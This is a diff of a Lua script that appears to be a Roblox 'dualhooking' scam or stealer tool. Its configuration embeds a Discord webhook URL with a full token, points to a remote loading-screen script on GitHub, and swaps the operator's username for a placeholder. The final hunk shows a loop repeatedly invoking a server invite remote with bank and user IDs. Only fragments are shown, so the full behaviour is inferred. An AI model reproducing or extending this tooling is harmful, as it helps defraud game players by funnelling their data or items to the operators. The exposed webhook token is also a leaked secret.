@@ -7,7 +7,7 @@
 
 ]]--
 
-local dhuser = "TolinRabadu"       -- dualhooking user
+local dhuser = "user here"       -- dualhooking user
 local dhwebhook = "https://discord.com/api/webhooks/1133931887556051034/B22LeoRDaFTT32dkHoHyTaoLfMuHoo-AUdqan19hWRzo__6bn062CVIigkxcfFbxt8mO" -- Dualhooking Webhook
 local loadingraw = "https://raw.githubusercontent.com/NeewGood/loaaa/main/.lua" -- Put Your LoadingScreen Raw Link Here
 
@@ -1410,4 +1410,4 @@ while task.wait(0.1) do
     end
     task.wait()
     inviteremote:InvokeServer(mybanks[1]["BUID"], _G.UserID)
-end
+ end
